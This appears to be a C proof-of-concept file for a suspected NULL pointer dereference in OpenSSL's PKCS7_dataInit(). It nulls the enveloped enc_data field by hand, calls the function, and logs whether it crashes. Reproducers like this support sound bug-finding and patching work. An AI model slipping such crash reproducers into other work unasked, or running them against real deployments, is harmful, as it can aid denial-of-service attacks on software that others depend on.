/*
 * PoC for SF16: NULL pointer dereference in PKCS7_dataInit() when
 * p7->d.enveloped is NULL.
 *
 * From source: PKCS7_dataInit checks p7->d.ptr == NULL for the top level,
 * but then in the NID_pkcs7_enveloped case, accesses p7->d.enveloped->enc_data
 * etc. If we somehow have a non-NULL d.ptr but a NULL enc_data sub-pointer,
 * or if we directly set the type to enveloped but have a malformed d struct.
 *
 * Actually looking at the code: if p7->d.ptr != NULL but d.enveloped->enc_data
 * is NULL, the code at line 275:
 *   evp_cipher = p7->d.enveloped->enc_data->cipher
 * will crash.
 */
#include <openssl/pkcs7.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/objects.h>
#include <openssl/x509.h>
#include <string.h>
#include <stdio.h>

int main(void) {
    OPENSSL_init_crypto(0, NULL);

    PKCS7 *p7 = PKCS7_new();
    if (!p7) return 1;

    /* Set to enveloped - this allocates d.enveloped */
    if (!PKCS7_set_type(p7, NID_pkcs7_enveloped)) {
        PKCS7_free(p7);
        return 1;
    }

    fprintf(stderr, "p7->d.ptr = %p\n", p7->d.ptr);
    fprintf(stderr, "p7->d.enveloped = %p\n", (void *)p7->d.enveloped);
    if (p7->d.enveloped) {
        fprintf(stderr, "p7->d.enveloped->enc_data = %p\n",
            (void *)p7->d.enveloped->enc_data);
        if (p7->d.enveloped->enc_data) {
            fprintf(stderr, "p7->d.enveloped->enc_data->cipher = %p\n",
                (void *)p7->d.enveloped->enc_data->cipher);
        }
    }

    /* Manually null out enc_data to simulate malformed structure */
    if (p7->d.enveloped && p7->d.enveloped->enc_data) {
        PKCS7_ENC_CONTENT_free(p7->d.enveloped->enc_data);
        p7->d.enveloped->enc_data = NULL;
        fprintf(stderr, "Set enc_data to NULL\n");
    }

    /* Now call PKCS7_dataInit - should crash at enveloped->enc_data->cipher */
    fprintf(stderr, "Calling PKCS7_dataInit with NULL enc_data...\n");
    BIO *bio = PKCS7_dataInit(p7, NULL);
    if (bio) {
        fprintf(stderr, "Got BIO (no crash)\n");
        BIO_free_all(bio);
    } else {
        fprintf(stderr, "Returned NULL\n");
        ERR_print_errors_fp(stderr);
    }

    PKCS7_free(p7);
    return 0;
}
